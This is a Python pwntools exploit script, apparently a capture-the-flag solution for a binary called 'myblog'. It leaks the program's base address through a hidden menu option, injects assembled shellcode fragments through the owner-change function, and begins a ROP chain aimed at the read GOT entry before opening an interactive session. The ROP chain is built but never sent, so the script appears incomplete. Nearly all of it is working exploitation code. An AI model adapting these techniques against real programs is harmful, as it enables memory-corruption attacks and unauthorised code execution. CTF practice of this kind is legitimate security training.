#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
from parse import *
context.log_level="debug"
pwn_file="./myblog"
elf=ELF(pwn_file)
context.arch="amd64"
if len(sys.argv)==1:
    conn=process(pwn_file)
    pid=conn.pid
else:
    conn=remote("ss",7777)
#    conn=remote("pwn.it",3333)
    pid=0

def debug():
    log.debug("base address:0x%x"%elf.address)
    log.debug("process pid:%d"%pid)
    pause()

def change_owner(name):
    conn.sendlineafter("4. Exit\n","3")
    data=conn.recvline()
    conn.sendafter("New Owner : \n",name)
    return parse("Old Owner : {}\n",data)[0]

def write(content,author):
    conn.sendlineafter("4. Exit\n","1")
    conn.sendafter("Input content\n",content)
    conn.sendafter("Input author\n",author)

def dele(idx):
    conn.sendlineafter("4. Exit\n","2")
    conn.sendlineafter("Input index\n",str(idx))

def show_gift():
    conn.sendlineafter("4. Exit\n","31337")
    conn.recvline()
    data=conn.recvline()
    ret=int(parse("I will give you a gift {}\n",data)[0],16)
    elf.address=ret-0xef4
    f={
        0:elf.address+0x1000,
        0x8:elf.address+0x202040,
        0x10:elf.address+0x105c,
    }
    conn.send(fit(f,filler="\x00"))
    return ret

#1
show_gift()
code="""
    call .-0x605000+0x104010
    ret
"""
change_owner(asm(code))
#2
show_gift()
code="""
    push rsp
    pop rsi
    jmp .+0x1ffe
"""
change_owner(asm(code))
#3
show_gift()
code="""
    pop rdi
    jmp .+0x2000-1
"""
change_owner(asm(code))
#4
show_gift()
code="""
    mov edx,edx
    jmp .+0x2000-2
"""
change_owner(asm(code))
debug()
conn.sendlineafter("Exit","5")
rop=p64(elf.address+0x116A)
rop+=p64(0)+p64(1)+p64(elf.got["read"])+p64(0)+p64(0)


conn.interactive()
